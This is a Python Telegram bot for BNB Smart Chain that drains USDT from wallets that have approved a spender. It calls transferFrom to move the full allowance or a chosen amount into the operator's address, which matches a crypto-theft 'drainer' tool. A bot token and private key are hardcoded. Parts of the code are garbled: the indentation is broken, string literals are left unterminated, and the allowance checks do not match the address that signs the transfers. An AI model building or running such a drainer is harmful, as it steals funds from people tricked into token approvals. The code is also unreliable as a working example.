
import logging
from web3 import Web3
from telegram import InlineKeyboardButton, InlineKeyboardMarkup, Update
from telegram.ext import ApplicationBuilder, CallbackQueryHandler, CommandHandler, ContextTypes, MessageHandler, filters

# === CONFIGURATION ===
BOT_TOKEN = "7477590341:AAHz8Yl2jYCZIa2uBJQnYFifQAUk0WGWkUY"
BSC_RPC = "https://bsc-dataseed.binance.org/"
SPENDER_ADDRESS = Web3.to_checksum_address(
    "0x519Ed2DFD2DAadBA796b152f87812Fbd85638e53")
USDT_ADDRESS = Web3.to_checksum_address(
    "0x55d398326f99059fF775485246999027B3197955")
# ⚠️ IMPORTANT: Replace before use
PRIVATE_KEY = "0x3fc991c3d80fc48df555b8f11bbf402c98f463f23fcde65f1df7a8884cda7ec1"

w3 = Web3(Web3.HTTPProvider(BSC_RPC))
account = w3.eth.account.from_key(PRIVATE_KEY)
my_address = account.address

# === USDT ABI (partial) ===
ERC20_ABI = [
    {"constant": True, "inputs": [{"name": "owner", "type": "address"}, {"name": "spender", "type": "address"}],
        "name": "allowance", "outputs": [{"name": "", "type": "uint256"}], "type": "function"},
    {"constant": True, "inputs": [{"name": "account", "type": "address"}], "name": "balanceOf", "outputs": [
        {"name": "", "type": "uint256"}], "type": "function"},
    {"constant": False, "inputs": [{"name": "sender", "type": "address"}, {"name": "recipient", "type": "address"}, {
        "name": "amount", "type": "uint256"}], "name": "transferFrom", "outputs": [{"name": "", "type": "bool"}], "type": "function"}
]

usdt = w3.eth.contract(address=USDT_ADDRESS, abi=ERC20_ABI)

# === STATE ===
approved_wallets = {}

# === LOGGING ===
logging.basicConfig(level=logging.INFO)

# === BUTTONS ===


def main_menu():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("➕ Enter Approved Wallet",
                              callback_data="enter_wallet")],
        [InlineKeyboardButton("💸 Withdraw All USDT",
                              callback_data="withdraw_all")],
        [InlineKeyboardButton("✏️ Withdraw Custom Amount",
                              callback_data="withdraw_custom")],
        [InlineKeyboardButton("⚙️ Toggle Auto Mode (soon)",
                              callback_data="auto_mode")]
    ])

# === COMMANDS ===


async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("Welcome! Choose an option:", reply_markup=main_menu())

# === CALLBACK HANDLER ===


async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    data = query.data

    if data == "enter_wallet":
        await query.edit_message_text("Send the approved wallet address:")
        context.user_data["awaiting_wallet"] = True

    elif data == "withdraw_all":
        wallet = context.user_data.get("wallet")
        if not wallet:
            await query.edit_message_text("No wallet set. Click 'Enter Approved Wallet' first.")
            return
        await query.edit_message_text("Processing full withdrawal...")
        await withdraw_all(context, query, wallet)

    elif data == "withdraw_custom":
        await query.edit_message_text("Send the amount (in USDT) to withdraw:")
        context.user_data["awaiting_amount"] = True

# === TEXT HANDLER ===


async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text

    if context.user_data.get("awaiting_wallet"):
        if w3.is_address(text):
            wallet = Web3.to_checksum_address(text)
            context.user_data["wallet"] = wallet
            context.user_data["awaiting_wallet"] = False
            await update.message.reply_text(f"Wallet saved: {wallet}", reply_markup=main_menu())
        else:
            await update.message.reply_text("❌ Invalid address. Try again.")

    elif context.user_data.get("awaiting_amount"):
        try:
            value = float(text)
            amount = int(value * (10 ** 18))
            wallet = context.user_data.get("wallet")
            if not wallet:
                await update.message.reply_text("No approved wallet set. Please enter one first.")
                return
            context.user_data["awaiting_amount"] = False
            await update.message.reply_text("Processing custom withdrawal...")
            await withdraw_custom(context, update.message, wallet, amount)
        except ValueError:
            await update.message.reply_text("❌ Invalid number. Send a valid amount.")

# === WITHDRAWAL FUNCTIONS ===


async def withdraw_all(context, msg_obj, from_wallet):
    allowance = usdt.functions.allowance(from_wallet, SPENDER_ADDRESS).call()
    if allowance == 0:
        await msg_obj.edit_text("❌ No allowance detected.")
        return

      try:
             tx = usdt.functions.transferFrom(from_wallet, my_address, allowance).build_transaction({
            "from": my_address,
            "nonce": w3.eth.get_transaction_count(my_address),
            "gas": 100000,
            "gasPrice": w3.to_wei("5", "gwei") })
             
             signed = w3.eth.account.sign_transaction(tx, PRIVATE_KEY)
        tx_hash = w3.eth.send_raw_transaction(signed.rawTransaction)
                await msg_obj.edit_text(f"✅ Withdrawn {allowance / 1e18} USDT
                                Tx: https: // bscscan.com/tx/{tx_hash.hex()}")
             except Exception as e:
        await msg_obj.edit_text(f"❌ Error: {e}")


async def withdraw_custom(context, msg_obj, from_wallet, amount):
    allowance = usdt.functions.allowance(from_wallet, SPENDER_ADDRESS).call()
    if allowance < amount: 
        await msg_obj.reply_text("❌ Not enough allowance.")
        return

    try:
        tx = usdt.functions.transferFrom(from_wallet, my_address, amount).build_transaction({
            "from": my_address,
            "nonce": w3.eth.get_transaction_count(my_address),
            "gas": 100000,
            "gasPrice": w3.to_wei("5", "gwei")
        })
        signed = w3.eth.account.sign_transaction(tx, PRIVATE_KEY)
        tx_hash = w3.eth.send_raw_transaction(signed.rawTransaction)
        await msg_obj.reply_text(f"✅ Withdrawn {amount / 1e18} USDT
                                 Tx: https: // bscscan.com/tx/{tx_hash.hex()}")
    except Exception as e:
        await msg_obj.reply_text(f"❌ Error: {e}")

# === MAIN ===
app = ApplicationBuilder().token(BOT_TOKEN).build()
app.add_handler(CommandHandler("start", start))
app.add_handler(CallbackQueryHandler(button_handler))
app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text))

app.run_polling()
